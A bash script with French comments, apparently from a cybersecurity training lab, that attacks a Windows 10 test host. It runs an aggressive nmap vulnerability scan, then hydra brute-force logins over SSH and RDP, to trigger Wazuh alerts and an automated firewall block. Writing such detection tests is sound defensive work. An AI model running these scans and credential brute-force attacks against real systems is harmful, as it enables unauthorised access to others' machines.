#!/bin/bash
# ============================================================
#  ATTAQUE DE TEST - BTS CIEL IR - usage labo uniquement
#  Cible  : WIN10-test
#  Objectif: declencher alerte Wazuh high/critical
#            -> active-response -> SOAR dashboard -> firewall-drop
# ============================================================

TARGET="${1:-172.16.1.20}"   # IP de WIN10-test (adapter si besoin)
LOG="/tmp/attack_$(date +%Y%m%d_%H%M%S).log"

echo "============================================" | tee "$LOG"
echo " ATTAQUE SOAR TEST - cible : $TARGET"       | tee -a "$LOG"
echo " Log : $LOG"                                 | tee -a "$LOG"
echo "============================================" | tee -a "$LOG"

# --- Phase 1 : scan nmap agressif ---
# Wazuh detecte les scans SYN + scripts vuln (regle 5400+)
echo ""
echo "[1/3] Scan nmap agressif..." | tee -a "$LOG"
nmap -sS -A -T4 --script vuln "$TARGET" -oN /tmp/scan_result.txt 2>/dev/null
cat /tmp/scan_result.txt | tee -a "$LOG"
echo "     Scan termine."

# --- Phase 2 : brute-force SSH ---
# Wazuh regles 5551 (multiple failures) et 5763 (brute-force) -> level 10 (high)
echo ""
echo "[2/3] Brute-force SSH (port 22)..." | tee -a "$LOG"
WORDLIST=""
[ -f /usr/share/wordlists/rockyou.txt ] && WORDLIST="/usr/share/wordlists/rockyou.txt"
if [ -z "$WORDLIST" ]; then
    printf "password\n123456\nadmin\ntest\nazerty\nletmein\nqwerty\nP@ssw0rd\nwelcome\n" > /tmp/mini.txt
    WORDLIST="/tmp/mini.txt"
fi

for USER in administrator admin user test; do
    echo "  -> hydra SSH user=$USER" | tee -a "$LOG"
    hydra -l "$USER" -P "$WORDLIST" -t 4 -f "$TARGET" ssh 2>/dev/null         | grep -E "login:|FAILED|host:" | head -3 | tee -a "$LOG"
done
echo "     SSH termine."

# --- Phase 3 : brute-force RDP ---
# Wazuh regles Windows (60122+) -> level 10-12 (high/critical)
echo ""
echo "[3/3] Brute-force RDP (port 3389)..." | tee -a "$LOG"
printf "administrator\nadmin\nuser\n" > /tmp/users_rdp.txt
hydra -L /tmp/users_rdp.txt -P "$WORDLIST" -t 1 "$TARGET" rdp 2>/dev/null     | grep -E "login:|host:" | head -5 | tee -a "$LOG"
echo "     RDP termine."

echo "" | tee -a "$LOG"
echo "============================================" | tee -a "$LOG"
echo " FIN. Verifie le dashboard :"                | tee -a "$LOG"
echo " https://172.16.1.15"                        | tee -a "$LOG"
echo " Log complet : $LOG"                         | tee -a "$LOG"
echo "============================================" | tee -a "$LOG"
